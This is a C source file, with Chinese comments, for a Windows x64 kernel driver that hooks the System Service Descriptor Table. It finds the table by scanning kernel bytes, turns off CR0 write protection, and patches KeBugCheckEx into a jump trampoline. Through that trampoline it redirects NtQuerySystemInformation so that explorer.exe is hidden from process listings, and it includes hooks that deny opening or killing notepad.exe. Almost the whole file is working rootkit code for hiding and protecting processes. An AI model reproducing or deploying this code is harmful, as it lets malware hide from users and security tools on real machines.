#include"SSDT_Hook.h"

#define SETBIT(x,y) x|=(1<<y) //将X的第Y位置1
#define CLRBIT(x,y) x&=~(1<<y) //将X的第Y位清0
#define GETBIT(x,y) (x & (1 << y)) //取X的第Y位，返回0或非0

void WPOFF()
{
	_disable(); //disable interrupts
	__writecr0(__readcr0() & (~(0x10000)));
}
void WPON()
{
	__writecr0(__readcr0() ^ 0x10000);
	_enable();
}


ULONGLONG GetKeServiceDescriptorTableShadowAddrX64()
{
	PUCHAR StartSearchAddress = (PUCHAR)__readmsr(0xC0000082);
	PUCHAR EndSearchAddress = StartSearchAddress + 0x500;
	PUCHAR i = NULL;
	UCHAR b1 = 0, b2 = 0, b3 = 0;
	ULONGLONG templong = 0;
	ULONGLONG addr = 0;
	for (i = StartSearchAddress; i<EndSearchAddress; i++)
	{
		if (MmIsAddressValid(i) && MmIsAddressValid(i + 1) && MmIsAddressValid(i + 2))
		{
			b1 = *i;
			b2 = *(i + 1);
			b3 = *(i + 2);
			if (b1 == 0x4c && b2 == 0x8d && b3 == 0x1d) //4c8d1d
			{
				memcpy(&templong, i + 3, 4);
				addr = (ULONGLONG)templong + (ULONGLONG)i + 7;
				/*DbgPrint("b1 = %0x\n", b1);
				DbgPrint("b2 = %0x\n", b2);
				DbgPrint("b3 = %0x", b3);
				DbgPrint("templong = %lx\n", templong);
				DbgPrint("SSDT Shadow addr = %x\n", addr);
				//	DbgPrint("SSDT Shadow addr = %x\n", addr+8);*/

				return addr;
			}
		}
	}
	return 0;
}
//获取SSDT 表的地址，其实是 SYSTEM_SERVICE_TABLE结构的地址，该结构中的ServiceTableBase成员记录了SSDT的基址
ULONGLONG  GetKeServiceDescriptorTableAddrX64()
{
	PUCHAR StartSearchAddress = (PUCHAR)__readmsr(0xC0000082);
	PUCHAR EndSearchAddress = StartSearchAddress + 0x500;
	PUCHAR i = NULL;
	UCHAR b1 = 0, b2 = 0, b3 = 0;
	ULONGLONG templong = 0;
	ULONGLONG addr = 0;
	for (i = StartSearchAddress; i<EndSearchAddress; i++)
	{
		if (MmIsAddressValid(i) && MmIsAddressValid(i + 1) && MmIsAddressValid(i + 2))
		{
			b1 = *(i);
			b2 = *(i + 1);
			b3 = *(i + 2);
			if (b1 == 0x4c && b2 == 0x8d && b3 == 0x15)
			{
				memcpy(&templong, i + 3, 4);
				//核心部分  
				//kd> db fffff800`03e8b772  
				//fffff800`03e8b772  4c 8d 15 c7 20 23 00 4c-8d 1d 00 21 23 00 f7 83  L... #.L...!#...  
				//templong = 002320c7 ,i = 03e8b772, 7为指令长度  
				addr = (ULONGLONG)templong + (ULONGLONG)i + 7;
				break;
			}
		}
	}
	DbgPrint("b1 = %0x\n", b1);
	DbgPrint("b2 = %0x\n", b2);
	DbgPrint("b3 = %0x", b3);
	DbgPrint("templong = %x\n", templong);
	DbgPrint("SSDT addr = %x\n", addr);
	//DbgPrint("SSDT addr = %x\n", addr+8);
	return addr;
}
//通过索引值（下标）获取SSDT表中对应的函数地址
ULONGLONG GetSSDTFuncCurAddrByIndex(ULONG index)
{
	LONG dwtmp = 0;
	ULONGLONG addr = 0;
	PULONG ServiceTableBase = NULL;
	ServiceTableBase = (PULONG)KeServiceDescriptorTable->ServiceTableBase;
	dwtmp = ServiceTableBase[index];
	dwtmp = dwtmp >> 4;
	addr = ((LONGLONG)dwtmp + (ULONGLONG)ServiceTableBase);//&0xFFFFFFF0;
	return addr;
}

NTSTATUS __fastcall Fake_NtCreateFile(
	__out     PHANDLE FileHandle,
	__in      ACCESS_MASK DesiredAccess,
	__in      POBJECT_ATTRIBUTES ObjectAttributes,
	__out     PIO_STATUS_BLOCK IoStatusBlock,
	__in_opt  PLARGE_INTEGER AllocationSize,
	__in      ULONG FileAttributes,
	__in      ULONG ShareAccess,
	__in      ULONG CreateDisposition,
	__in      ULONG CreateOptions,
	__in      PVOID EaBuffer,
	__in      ULONG EaLength
)
{
	NTSTATUS st;
	st = NtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
	DbgPrint("Fake_NtCreateFile called: %x", st);
	DbgPrint("%s", *ObjectAttributes->ObjectName);
	DbgPrint("%s", ObjectAttributes->RootDirectory);
	//ObjectAttributes->

	return st;
}

//定义自己的NtOpenProcess  
NTSTATUS __stdcall Fake_NtOpenProcess(OUT PHANDLE  ProcessHandle,
	IN ACCESS_MASK  DesiredAccess,
	IN POBJECT_ATTRIBUTES  ObjectAttributes,
	IN OPTIONAL PCLIENT_ID  ClientId)
{
	PEPROCESS process = NULL;
	//NTSTATUS rtStatus = ObReferenceObjectByHandle(ProcessHandle,FILE_READ_DATA, NULL, KernelMode, &process, NULL);
	NTSTATUS st = ObReferenceObjectByHandle(ProcessHandle, 0, *PsProcessType, KernelMode, (PVOID*)&process, NULL);
	DbgPrint("进入HOOK函数.\n");
	if (NT_SUCCESS(st))
	{
		if (!_stricmp((char*)PsGetProcessImageFileName(process), "notepad.exe"))
		{

			return STATUS_ACCESS_DENIED;
		}
		else
		{
			return OldOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
		}
	}
	else
	{
		return STATUS_ACCESS_DENIED;
	}
}

NTSTATUS HookNtTerminateProcess(
	__in_opt HANDLE ProcessHandle,
	__in NTSTATUS ExitStatus
)
{
	PEPROCESS process = NULL;
	//NTSTATUS rtStatus = ObReferenceObjectByHandle(ProcessHandle,FILE_READ_DATA, NULL, KernelMode, &process, NULL);
	NTSTATUS st = ObReferenceObjectByHandle(ProcessHandle, 0, *PsProcessType, KernelMode, (PVOID*)&process, NULL);
	DbgPrint("enter hook NtTerminateProcess.\n");
	if (NT_SUCCESS(st))
	{
		if (!_stricmp((char*)PsGetProcessImageFileName(process), "notepad.exe"))
		{

			return STATUS_ACCESS_DENIED;
		}
		else
		{
			return OldNtTerminateProcess(ProcessHandle, ExitStatus);
		}
	}
	else
	{
		return STATUS_ACCESS_DENIED;
	}

}




NTSTATUS HookNtQuerySystemInformation(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__out_bcount_opt(SystemInformationLength) PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
)
{

	NTSTATUS rtStatus;
	//pOldNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)oldSysServiceAddr[261];

	rtStatus = pOldNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if (NT_SUCCESS(rtStatus))
	{
		if (SystemProcessInformation == SystemInformationClass)
		{
			PSYSTEM_PROCESS_INFORMATION pPrevProcessInfo = NULL;
			PSYSTEM_PROCESS_INFORMATION pCurrProcessInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

			while (pCurrProcessInfo != NULL)
			{
				ULONG uPID = (ULONG)pCurrProcessInfo->UniqueProcessId;
				UNICODE_STRING strTmpProcessName = pCurrProcessInfo->ImageName;
				UNICODE_STRING hidestring;

				RtlInitUnicodeString(&hidestring, L"explorer.exe");

				//				DbgPrint("Process Name:%d\n", strTmpProcessName.Length);
				if (!RtlCompareUnicodeString(&hidestring, &strTmpProcessName, TRUE))
				{
					if (pPrevProcessInfo)
					{
						if (pCurrProcessInfo->NextEntryOffset)
						{
							pPrevProcessInfo->NextEntryOffset += pCurrProcessInfo->NextEntryOffset;
						}
						else
						{
							pPrevProcessInfo->NextEntryOffset = 0;
						}
					}
					else
					{
						if (pCurrProcessInfo->NextEntryOffset)
						{
							SystemInformation = (PCHAR)SystemInformation + pCurrProcessInfo->NextEntryOffset;
						}
						else
						{
							SystemInformation = 0;
						}
					}
				}

				pPrevProcessInfo = pCurrProcessInfo;
				if (pCurrProcessInfo->NextEntryOffset)
				{
					pCurrProcessInfo = (PSYSTEM_PROCESS_INFORMATION)(((PCHAR)pCurrProcessInfo) + pCurrProcessInfo->NextEntryOffset);
				}
				else
				{
					pCurrProcessInfo = NULL;
				}
			}
		}
	}

	return rtStatus;
}

/*

* 首先，知道了SSDT表的地址后，知道目标函数的index值，计算出目标函数targetFuncAddr地址的计算方式如下
*
* ServiceTableBase[Index] >> 4 + ServiceTableBase 就是目标函数地址了。
* 那么在进行SSDT hook时，不能直接ServiceTableBase[Index]=targetFuncAddr。
* 而是要根据已知的目标函数地址，其对应的索引值Index，和ServiceTableBase进行发推出ServiceTableBase[index]的值
	就是这个表（数组）对应的索引（下标）处该填入什么样的数据，
* 才能根据上述提到的计算目标函数地址的计算公式计算出目标函数的地址。
* 已知量： ServiceTableBase，index,targetFuncAddr
* 未知量:ServiceTableBase[Index] ,设为X=ServiceTableBase[Index]
* 则：X>>4+ ServiceTableBase=targetFuncAddr
* 得出：X=(targetFuncAddr-ServiceTableBase)<<4
* 这样就计算出了X的值，就是表中对应索引处该填入的值

* ULONG GetOffsetAddress(ULONGLONG FuncAddr, CHAR ParamCount) 函数就是做这件事的


*/

//根据目标函数地址（已知），索引值（已知），SSDT表基地址（已知），求出SSDT[index]的值
ULONG GetOffsetAddress(ULONGLONG FuncAddr, CHAR ParamCount)
{
	LONG dwtmp = 0, i;
	CHAR b = 0, bits[4] = { 0 };
	PULONG ServiceTableBase = NULL;
	ServiceTableBase = (PULONG)KeServiceDescriptorTable->ServiceTableBase;
	dwtmp = (LONG)(FuncAddr - (ULONGLONG)ServiceTableBase);
	dwtmp = dwtmp << 4;
	//处理参数
	if (ParamCount>4)
		ParamCount = ParamCount - 4;
	else
		ParamCount = 0;
	//获得dwtmp的第一个字节
	memcpy(&b, &dwtmp, 1);
	//处理低四位，填写参数个数
	for (i = 0; i<4; i++)
	{
		bits[i] = GETBIT(ParamCount, i);
		if (bits[i])
			SETBIT(b, i);
		else
			CLRBIT(b, i);
	}
	//把数据复制回去
	memcpy(&dwtmp, &b, 1);
	return dwtmp;
}

//内核中用不到的方法，二次跳转用(自己的NtOpenProcess跳到KeBugCheckEx函数，然后再KeBugCheckEx函数跳到要Hook的NtOpenProcess)  
VOID FuckKeBugCheckEx()
{
	KIRQL irql;
	ULONGLONG myfun;
	//jmp     qword ptr addrss,FF 25 对应jmp qword ptr的操作码
	UCHAR jmp_code[] = "\xFF\x25\x00\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF";//FF对应JMP指令的OpCode
	myfun = (ULONGLONG)HookNtQuerySystemInformation;
	memcpy(jmp_code + 6, &myfun, 8);//用myfun的地址，填充jmp_code的最后8个字节，借助KeBugCheckEx函数实现跳转到自己写的Hook函数
	irql = WPOFFx64();
	memset(KeBugCheckEx, 0x90, 15);//用15 0x90填充KeBugCheckEx
	memcpy(KeBugCheckEx, jmp_code, 14);
	WPONx64(irql);
	//就是将KeBugCheckEx函数头部修改为 JMP QWORD PTR addr 实现跳转到自己的Hook函数
}

VOID HookSSDT()
{
	KIRQL irql;
	LONG dwtmp = 0;
	PULONG ServiceTableBase = NULL;
	//get old address
	DbgPrint("NtQuerySystemInformation index: %ld\n", index);
	pOldNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetSSDTFuncCurAddrByIndex(index);
	DbgPrint("Old_NtQuerySystemInformation: %llx\n", (ULONGLONG)pOldNtQuerySystemInformation);
	//show new address
	ServiceTableBase = (PULONG)KeServiceDescriptorTable->ServiceTableBase;
	//get offset value
	//dwtmp = GetOffsetAddress((ULONGLONG)KeBugCheckEx, 11);//去掉这行也没影响
	//set kebugcheckex
	FuckKeBugCheckEx();
	//record old offset value
	OldTpVal = ServiceTableBase[index];
	irql = WPOFFx64();
	//这里重新计算出SSDT[index]的值后，之后SSDT[index]最终定位到的函数不是HookNtTerminateProccess函数的地址
	//而是KeBugCheckEx函数的地址,也就是二次跳转才能跳转到HookNtTermianteProcess函数，
	//SSDT-->KeBugCheckex--->HookNtTerminateProcess
	//实际修改了两处：1是KeBugCheckEx函数的头部被修改为JMP QWORD PTR [addr]，[addr]存放着HootNtTerminateProcesss的地址
	//                2 是SSDT[index]被修改为KeBugCheckEx函数（该函数被修改过）的地址
	ServiceTableBase[index] = GetOffsetAddress((ULONGLONG)KeBugCheckEx, 11);//貌似这个11这个参数不影响程序的正确执行。

	WPONx64(irql);
	DbgPrint("KeBugCheckEx: %llx\n", (ULONGLONG)KeBugCheckEx);
	DbgPrint("New_NtQuerySystemInformation: %llx\n", GetSSDTFuncCurAddrByIndex(index));
}

VOID UnhookSSDT()
{
	KIRQL irql;
	PULONG ServiceTableBase = NULL;
	ServiceTableBase = (PULONG)KeServiceDescriptorTable->ServiceTableBase;
	//set value
	irql = WPOFFx64();
	ServiceTableBase[index] = OldTpVal;	//GetOffsetAddress((ULONGLONG)NtCreateFile);
	WPONx64(irql);
}


#pragma INITCODE
extern "C" NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT pDriverObject,
	IN PUNICODE_STRING pRegistryPath)
{
	//DbgBreakPoint();
	NTSTATUS status = STATUS_SUCCESS;
	KdPrint(("Enter DriverEntry\n"));
	KeServiceDescriptorTable = (PSYSTEM_SERVICE_TABLE)GetKeServiceDescriptorTableAddrX64();
	GetKeServiceDescriptorTableShadowAddrX64();
	ULONG NtTerminateAddr = GetSSDTFuncCurAddrByIndex(41);
	DbgPrint("NtTerminateAddr %x\n", NtTerminateAddr);

	HookSSDT();


	KdPrint(("DriverEntry end\n"));
	return status;
}